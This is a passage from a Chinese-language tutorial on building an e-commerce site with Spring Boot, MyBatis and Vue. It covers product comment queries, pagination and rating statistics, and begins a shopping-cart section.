tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b.html?pid=101&amp;pname=咪咪虾条<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>跳转到B页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>b.html</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>This is Page B...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/utils.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> pid <span class="token operator">=</span> <span class="token function">getUrlParam</span><span class="token punctuation">(</span><span class="token string">"pid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="十四、商品详情展示—显示商品评论信息"><a href="#十四、商品详情展示—显示商品评论信息" class="headerlink" title="十四、商品详情展示—显示商品评论信息"></a>十四、商品详情展示—显示商品评论信息</h2><h4 id="14-1-接口实现"><a href="#14-1-接口实现" class="headerlink" title="14.1 接口实现"></a>14.1 接口实现</h4><h6 id="14-1-1-数据库实现"><a href="#14-1-1-数据库实现" class="headerlink" title="14.1.1 数据库实现"></a>14.1.1 数据库实现</h6><ul><li>数据表分析及数据准备</li><li>SQL</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 根据ID查询商品的评价信息，关联查询评价用户的信息</span><span class="token keyword">select</span> u<span class="token punctuation">.</span>username<span class="token punctuation">,</span>u<span class="token punctuation">.</span>nickname<span class="token punctuation">,</span>u<span class="token punctuation">.</span>user_img<span class="token punctuation">,</span>c<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">from</span> product_comments c<span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> users u<span class="token keyword">ON</span> u<span class="token punctuation">.</span>user_id <span class="token operator">=</span> c<span class="token punctuation">.</span>user_id<span class="token keyword">WHERE</span> c<span class="token punctuation">.</span>product_id <span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>实体类封装<code>ProductCommentsVO</code></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductCommentsVO</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> commId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> productId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> productName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> orderItemId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> isAnonymous<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> commType<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> commLevel<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> commContent<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> commImgs<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> sepcName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> replyStatus<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> replyContent<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Date</span> replyTime<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> isShow<span class="token punctuation">;</span>    <span class="token comment">//封装评论对应的用户数据</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userId<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> nickname<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userImg<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在Mapper接口定义查询方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ProductCommentsMapper</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductComments</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductCommentsVO</span><span class="token punctuation">&gt;</span></span> <span class="token function">selectCommontsByProductId</span><span class="token punctuation">(</span><span class="token class-name">String</span> productId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>映射配置：</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="14-1-2-业务层实现"><a href="#14-1-2-业务层实现" class="headerlink" title="14.1.2 业务层实现"></a>14.1.2 业务层实现</h6><ul><li>创建<code>ProductCommontsService</code>接口定义方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ProductCommontsService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCommontsByProductId</span><span class="token punctuation">(</span><span class="token class-name">String</span> productId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>创建实现类<code>ProductCommontsServiceImpl</code>实现查询操作</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductCommontsServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">ProductCommontsService</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProductCommentsMapper</span> productCommentsMapper<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">listCommontsByProductId</span><span class="token punctuation">(</span><span class="token class-name">String</span> productId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ProductCommentsVO</span><span class="token punctuation">&gt;</span></span> productCommentsVOS <span class="token operator">=</span> productCommentsMapper<span class="token punctuation">.</span><span class="token function">selectCommontsByProductId</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">,</span> productCommentsVOS<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="14-1-3-控制层实现"><a href="#14-1-3-控制层实现" class="headerlink" title="14.1.3 控制层实现"></a>14.1.3 控制层实现</h6><ul><li>ProductController</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"商品评论信息查询接口"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/detail-commonts/{pid}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">getProductCommonts</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"pid"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> pid<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> productCommontsService<span class="token punctuation">.</span><span class="token function">listCommontsByProductId</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="14-2-前端评论内容显示"><a href="#14-2-前端评论内容显示" class="headerlink" title="14.2 前端评论内容显示"></a>14.2 前端评论内容显示</h4><h2 id="十五、商品详情展示—商品评论分页及统计信息"><a href="#十五、商品详情展示—商品评论分页及统计信息" class="headerlink" title="十五、商品详情展示—商品评论分页及统计信息"></a>十五、商品详情展示—商品评论分页及统计信息</h2><h4 id="15-1-流程分析"><a href="#15-1-流程分析" class="headerlink" title="15.1 流程分析"></a>15.1 流程分析</h4><p><img src="imgs/1619574986954.png" alt="1619574986954"></p><h4 id="15-2-接口开发"><a href="#15-2-接口开发" class="headerlink" title="15.2 接口开发"></a>15.2 接口开发</h4><h6 id="15-2-1-改造商品评论列表接口"><a href="#15-2-1-改造商品评论列表接口" class="headerlink" title="15.2.1 改造商品评论列表接口"></a>15.2.1 改造商品评论列表接口</h6><blockquote><p>分页查询</p></blockquote><ul><li><p>定义PageHelper</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PageHelper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token comment">//总记录数</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token comment">//总页数</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> pageCount<span class="token punctuation">;</span>    <span class="token comment">//分页数据</span>    <span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>改造数据库操作</p><table><thead><tr><th>ProductCommentsMapper 接口</th></tr></thead><tbody><tr><td><img src="imgs/1619576150309.png" alt="1619576150309"></td></tr></tbody></table><table><thead><tr><th>ProductCommentsMapper.xml映射配置</th></tr></thead><tbody><tr><td><img src="imgs/1619576213285.png" alt="1619576213285"></td></tr></tbody></table></li><li><p>改造业务逻辑层</p><table><thead><tr><th>ProductCommontsService接口</th></tr></thead><tbody><tr><td><img src="imgs/1619576427970.png" alt="1619576427970"></td></tr></tbody></table><table><thead><tr><th>ProductCommontsServiceImpl</th></tr></thead><tbody><tr><td><img src="imgs/1619576517049.png" alt="1619576517049"></td></tr></tbody></table></li><li><p>改造控制层</p><table><thead><tr><th>ProductController</th></tr></thead><tbody><tr><td><img src="imgs/1619576879670.png" alt="1619576879670"></td></tr></tbody></table></li></ul><h6 id="15-2-2-评价统计接口实现"><a href="#15-2-2-评价统计接口实现" class="headerlink" title="15.2.2 评价统计接口实现"></a>15.2.2 评价统计接口实现</h6><ul><li><p>数据库实现</p><ul><li>统计当前商品的总记录数</li><li>统计当前商品的好评/中评/差评</li></ul></li><li><p>业务层实现: <code>ProductCommontsServiceImpl</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">getCommentsCountByProductId</span><span class="token punctuation">(</span><span class="token class-name">String</span> productId<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//1.查询当前商品评价的总数</span>    <span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">ProductComments</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"productId"</span><span class="token punctuation">,</span>productId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> total <span class="token operator">=</span> productCommentsMapper<span class="token punctuation">.</span><span class="token function">selectCountByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.查询好评评价数</span>    criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"commType"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> goodTotal <span class="token operator">=</span> productCommentsMapper<span class="token punctuation">.</span><span class="token function">selectCountByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//3.查询好评评价数</span>    <span class="token class-name">Example</span> example1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">ProductComments</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria1 <span class="token operator">=</span>  example1<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria1<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"productId"</span><span class="token punctuation">,</span>productId<span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria1<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"commType"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> midTotal <span class="token operator">=</span> productCommentsMapper<span class="token punctuation">.</span><span class="token function">selectCountByExample</span><span class="token punctuation">(</span>example1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//4.查询好评评价数</span>    <span class="token class-name">Example</span> example2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">ProductComments</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria2 <span class="token operator">=</span>  example2<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria2<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"productId"</span><span class="token punctuation">,</span>productId<span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria2<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"commType"</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> badTotal <span class="token operator">=</span> productCommentsMapper<span class="token punctuation">.</span><span class="token function">selectCountByExample</span><span class="token punctuation">(</span>example2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//5.计算好评率</span>    <span class="token keyword">double</span> percent <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>goodTotal<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>total<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> percentValue <span class="token operator">=</span> <span class="token punctuation">(</span>percent<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span>percent<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"total"</span><span class="token punctuation">,</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"goodTotal"</span><span class="token punctuation">,</span>goodTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"midTotal"</span><span class="token punctuation">,</span>midTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"badTotal"</span><span class="token punctuation">,</span>badTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"percent"</span><span class="token punctuation">,</span>percentValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultVO</span> success <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> success<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="15-3-前端实现"><a href="#15-3-前端实现" class="headerlink" title="15.3 前端实现"></a>15.3 前端实现</h4><h6 id="15-3-1-商品评论的分页"><a href="#15-3-1-商品评论的分页" class="headerlink" title="15.3.1 商品评论的分页"></a>15.3.1 商品评论的分页</h6><ul><li><p>引用elementUI分页组件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 引入样式 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/element-ui/lib/theme-chalk/index.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- vue的引入必须在elementUI组件库引入之前 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 引入组件库 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/element-ui/lib/index.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>引用分页组件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--分页 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-pagination</span> <span class="token attr-name">background</span> <span class="token attr-name">layout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>prev, pager, next<span class="token punctuation">"</span></span>                <span class="token attr-name">:current-page</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pageNum<span class="token punctuation">"</span></span>               <span class="token attr-name">:page-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>limit<span class="token punctuation">"</span></span>                <span class="token attr-name">:total</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count<span class="token punctuation">"</span></span><span class="token attr-name">@current-change</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pager<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-pagination</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>监听分页组件的<code>页码改变</code>事件（点击上一页、下一页、页码都会导致<code>页码改变</code>）</p><p><code>分页组件的事件函数默认传递当前页码参数</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">pager</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">currentPage</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>pageNum <span class="token operator">=</span> currentPage<span class="token punctuation">;</span>    <span class="token comment">//请求下一页数据</span>    <span class="token keyword">var</span> url3 <span class="token operator">=</span> baseUrl<span class="token operator">+</span><span class="token string">"product/detail-commonts/"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>productId<span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url3<span class="token punctuation">,</span><span class="token punctuation">{</span>        params<span class="token operator">:</span><span class="token punctuation">{</span>            pageNum<span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>pageNum<span class="token punctuation">,</span>            limit<span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>limit        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>        <span class="token comment">//获取到评论分页数据</span>        <span class="token keyword">var</span> pageHelper <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token comment">//当前页的评论列表</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>productCommonts <span class="token operator">=</span> pageHelper<span class="token punctuation">.</span>list<span class="token punctuation">;</span>        <span class="token comment">//总页数</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>pageCount <span class="token operator">=</span> pageHelper<span class="token punctuation">.</span>pageCount<span class="token punctuation">;</span>        <span class="token comment">//总记录数</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> pageHelper<span class="token punctuation">.</span>count<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="15-3-2-商品评价统计"><a href="#15-3-2-商品评价统计" class="headerlink" title="15.3.2 商品评价统计"></a>15.3.2 商品评价统计</h6><h2 id="十六、购物车—添加购物车（登陆状态）"><a href="#十六、购物车—添加购物车（登陆状态）" class="headerlink" title="十六、购物车—添加购物车（登陆状态）"></a>十六、购物车—添加购物车（登陆状态）</h2><h4 id="16-1-流程分析"><a href="#16-1-流程分析" class="headerlink" title="16.1 流程分析"></a>16.1 流程分析</h4><p><img src="imgs/1619592683628.png" alt="1619592683628"></p><h4 id="16-2-接口实现"><a href="#16-2-接口实现" class="headerlink" title="16.2 接口实现"></a>16.2 接口实现</h4><h6 id="16-2-1-修改购物车数据表结构"><a href="#16-2-1-修改购物车数据表结构" class="headerlink" title="16.2.1 